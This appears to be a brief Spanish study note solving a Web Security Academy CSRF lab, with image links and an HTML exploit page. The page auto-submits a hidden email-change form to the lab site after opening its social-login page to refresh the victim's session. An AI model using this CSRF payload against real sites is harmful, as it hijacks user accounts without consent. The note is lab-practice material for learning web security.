
## Objetivo:

![[Pasted image 20240520001132.png]]


## Solucion:

![[Pasted image 20240520001307.png]]


![[Pasted image 20240520001203.png]]


```
<body>

<h1>Hola mundiooo</h1>

<form action="https://0ae1001903844b8f80000df0007000f5.web-security-academy.net/my-account/change-email" method="post">

<input type="hidden" name="email" value="pwned@gmail.com" />

</form>

  

<script>

window.addEventListener('click', e => {

window.open('https://0ae1001903844b8f80000df0007000f5.web-security-academy.net/social-login')

})

  

setTimeout(() => {

document.forms[0].submit()

}, 10000);

</script>

</body>
```

